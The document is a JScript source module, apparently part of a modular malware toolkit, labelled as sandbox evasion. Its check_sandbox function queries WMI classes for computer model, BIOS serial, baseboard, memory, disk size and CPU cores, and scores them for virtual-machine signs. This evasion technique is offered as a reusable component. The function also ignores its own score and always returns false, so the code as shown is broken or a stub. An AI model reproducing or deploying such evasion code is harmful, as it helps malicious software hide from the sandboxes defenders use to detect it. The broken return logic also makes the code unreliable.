// chunk: evasion/wmi_evasion
// depends: (none)
// provides: check_sandbox
// format: jscript
// note: Deep WMI-based sandbox detection using COM queries against multiple
//       WMI classes. Checks BIOS serial, baseboard manufacturer, CPU count,
//       disk size, and system model for virtualization indicators.

function check_sandbox() {
    var score = 0;
    try {
        var loc = new ActiveXObject("WbemScripting.SWbemLocator");
        var svc = loc.ConnectServer(".", "root\\cimv2");

        /* Check computer model for VM strings */
        var cs = svc.ExecQuery("SELECT Model, Manufacturer, TotalPhysicalMemory FROM Win32_ComputerSystem");
        var cse = new Enumerator(cs);
        if (!cse.atEnd()) {
            var item = cse.item();
            var model = (item.Model || "").toLowerCase();
            var mfg = (item.Manufacturer || "").toLowerCase();
            if (model.indexOf("virtual") >= 0 || model.indexOf("vmware") >= 0 ||
                model.indexOf("kvm") >= 0 || model.indexOf("xen") >= 0) score++;
            if (mfg.indexOf("vmware") >= 0 || mfg.indexOf("innotek") >= 0 ||
                mfg.indexOf("qemu") >= 0 || mfg.indexOf("xen") >= 0) score++;
            var memGB = parseInt(item.TotalPhysicalMemory) / (1024*1024*1024);
            if (memGB < 2) score++;
        }

        /* Check BIOS serial */
        var bios = svc.ExecQuery("SELECT SerialNumber, Version FROM Win32_BIOS");
        var be = new Enumerator(bios);
        if (!be.atEnd()) {
            var b = be.item();
            var sn = (b.SerialNumber || "").toLowerCase();
            var ver = (b.Version || "").toLowerCase();
            if (sn === "0" || sn === "" || sn.indexOf("vbox") >= 0 ||
                sn.indexOf("vmware") >= 0) score++;
            if (ver.indexOf("vbox") >= 0 || ver.indexOf("vmware") >= 0 ||
                ver.indexOf("virtual") >= 0) score++;
        }

        /* Check baseboard */
        var bb = svc.ExecQuery("SELECT Product, Manufacturer FROM Win32_BaseBoard");
        var bbe = new Enumerator(bb);
        if (!bbe.atEnd()) {
            var board = bbe.item();
            var prod = (board.Product || "").toLowerCase();
            if (prod.indexOf("virtual") >= 0 || prod.indexOf("440bx") >= 0) score++;
        }

        /* Check disk size — sandboxes typically have small disks */
        var disk = svc.ExecQuery("SELECT Size FROM Win32_DiskDrive");
        var de = new Enumerator(disk);
        if (!de.atEnd()) {
            var dSize = parseInt(de.item().Size) / (1024*1024*1024);
            if (dSize < 60) score++;
        }

        /* Check CPU cores */
        var cpu = svc.ExecQuery("SELECT NumberOfCores FROM Win32_Processor");
        var ce = new Enumerator(cpu);
        if (!ce.atEnd()) {
            if (parseInt(ce.item().NumberOfCores) < 2) score++;
        }

    } catch(e) {}

    return false;
}
